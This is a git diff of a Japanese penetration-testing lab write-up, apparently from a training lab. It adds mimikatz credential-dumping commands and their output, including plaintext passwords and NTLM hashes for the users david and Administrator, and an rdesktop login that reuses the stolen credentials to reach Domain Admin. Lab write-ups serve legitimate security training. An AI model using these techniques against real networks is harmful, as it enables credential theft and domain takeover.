@@ -161,6 +161,8 @@ member                 : {CN=Albert,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com, CN
 やはり！daisy（10.11.1.122）のとこにdavidのクリデンシャルがあった！！
 
 ```
+mimikatz # sekurlsa::logonpassworsd
+
 Authentication Id : 0 ; 412579 (00000000:00064ba3)
 Session           : Batch from 0
 User Name         : david
@@ -186,4 +188,40 @@ SID               : S-1-5-21-2293535422-227910474-3663383505-1123
          * Password : dsfdf34534tdfGDFG5rdgr
         ssp :
         credman :
+```
+
+# 10.11.1.120 (Domain Adminsに到着)
+上記でゲットしたdavidのクリデンシャルにより、rdpで接続
+
+```
+┌──(kali㉿kali)-[~]
+└─$ rdesktop -d xor.com -u david -p dsfdf34534tdfGDFG5rdgr 10.11.1.120
+```
+
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 464665 (00000000:00071719)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : xor
+Logon Server      : XOR-DC01
+Logon Time        : 12/18/2021 7:44:57 AM
+SID               : S-1-5-21-2293535422-227910474-3663383505-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : xor
+         * NTLM     : fc9bc6a6f510b2a92388f67962a33b1c
+         * SHA1     : 303100622417bd21a9b82abbf8825a61448bd30c
+         * DPAPI    : 4c38203099ddfa14c612c408642b4b70
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : xor
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : xor.com
+         * Password : foidf89734tedsFG3
 ```
